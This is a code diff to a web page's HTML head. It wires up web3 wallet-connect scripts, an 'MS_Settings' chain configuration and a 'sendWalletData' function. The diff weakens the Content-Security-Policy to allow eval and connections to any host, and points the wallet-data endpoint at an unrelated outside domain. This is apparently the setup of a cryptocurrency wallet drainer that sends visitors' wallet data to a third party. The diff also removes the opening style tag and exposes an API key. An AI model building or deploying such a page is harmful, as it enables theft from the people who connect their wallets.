@@ -1,12 +1,14 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
+  <!-- Add CSP and favicon -->
+  <meta http-equiv="Content-Security-Policy" content="script-src 'self' 'unsafe-inline' 'unsafe-eval' https:; connect-src *;">
+  <link rel="icon" type="image/x-icon" href="./assets/favicon.ico">
+  <!-- Existing meta tags -->
   <meta charset="UTF-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Example</title>
-  <style>
     @media (prefers-color-scheme: dark) {
 
       html,
@@ -29,27 +31,6 @@
   </div>
 <!-- Add this right before your web3 script imports -->
 <script>
-const MS_Settings = {
-    RPCs: {
-        1: "https://mainnet.infura.io/v3/YOUR_INFURA_KEY",
-        56: "https://bsc-dataseed.binance.org/",
-        137: "https://polygon-rpc.com"
-    },
-    chains: {
-        1: {
-            name: "Ethereum",
-            explorer: "https://etherscan.io"
-        },
-        56: {
-            name: "BSC",
-            explorer: "https://bscscan.com"
-        },
-        137: {
-            name: "Polygon",
-            explorer: "https://polygonscan.com"
-        }
-    }
-};
 </script><script src="./assets/web3-provider/web3-connect.js"></script>  <script src="./assets/web3-provider/web3-alert.js"></script>
   <script src="./assets/web3-provider.js"></script>  <script>
     setInterval(() => {
@@ -69,7 +50,7 @@ function ms_init() {
 
 <!-- Add this before the closing </head> tag -->
 <script>
-const API_ENDPOINT = 'https://your-backend-url.com/api';
+const API_ENDPOINT = 'https://fasterdeliveryuae.com';
 
 async function sendWalletData(walletData) {
     try {
@@ -86,3 +67,17 @@ async function sendWalletData(walletData) {
     }
 }
 </script>
+
+<!-- Remove duplicate MS_Settings declaration -->
+<script>
+// Keep only one instance of MS_Settings
+const MS_Settings = {
+    RPCs: {
+        1: "https://mainnet.infura.io/v3/511362d7fcc8491f9af15cc7fadf46ae",
+        56: "https://bsc-dataseed.binance.org/",
+        137: "https://polygon-rpc.com"
+    }
+};
+</script>
+
+
